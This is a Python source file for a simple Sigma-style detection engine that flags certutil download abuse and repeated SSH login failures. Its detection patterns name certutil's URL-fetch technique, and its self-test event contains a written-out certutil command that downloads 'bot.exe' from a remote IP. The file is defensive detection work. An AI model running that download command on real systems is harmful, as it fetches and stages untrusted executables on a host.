#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Production-Ready SOC & SIEM Sigma Detection Engine
Author: Toprak Ahmet Aydoğmuş
"""

import json
from typing import Dict, List, Any

class SigmaRule:
    def __init__(self, title: str, rule_id: str, severity: str, mitre_tag: str, match_field: str, patterns: List[str]):
        self.title = title
        self.rule_id = rule_id
        self.severity = severity
        self.mitre_tag = mitre_tag
        self.match_field = match_field
        self.patterns = [p.lower() for p in patterns]

    def evaluate(self, event: Dict[str, Any]) -> bool:
        val = str(event.get(self.match_field, "")).lower()
        return any(pattern in val for pattern in self.patterns)

class DetectionEngine:
    def __init__(self):
        self.rules: List[SigmaRule] = []

    def add_rule(self, rule: SigmaRule):
        self.rules.append(rule)

    def analyze(self, event: Dict[str, Any]) -> List[Dict[str, Any]]:
        alerts = []
        for rule in self.rules:
            if rule.evaluate(event):
                alerts.append({
                    "alert_id": f"ALT-{rule.rule_id[:8]}",
                    "title": rule.title,
                    "severity": rule.severity,
                    "mitre_tag": rule.mitre_tag,
                    "event_source": event.get("host", "Unknown")
                })
        return alerts

def build_default_engine() -> DetectionEngine:
    engine = DetectionEngine()
    engine.add_rule(SigmaRule(
        title="Suspicious LOLBAS Certutil Ingress",
        rule_id="a1928471-bcde-4123-8899-0123456789ab",
        severity="HIGH",
        mitre_tag="T1105",
        match_field="command_line",
        patterns=["certutil -urlcache", "certutil.exe -urlcache", "-split -f"]
    ))
    engine.add_rule(SigmaRule(
        title="Repeated SSH Authentication Failure",
        rule_id="b8273645-cdef-4234-9900-1234567890bc",
        severity="MEDIUM",
        mitre_tag="T1110",
        match_field="log_message",
        patterns=["Failed password for invalid user", "Failed password for root"]
    ))
    return engine

if __name__ == "__main__":
    engine = build_default_engine()
    test_event = {"host": "srv-prod01", "command_line": "certutil.exe -urlcache -split -f http://198.51.100.23/bot.exe"}
    print("[*] Detection Engine Test:", engine.analyze(test_event))
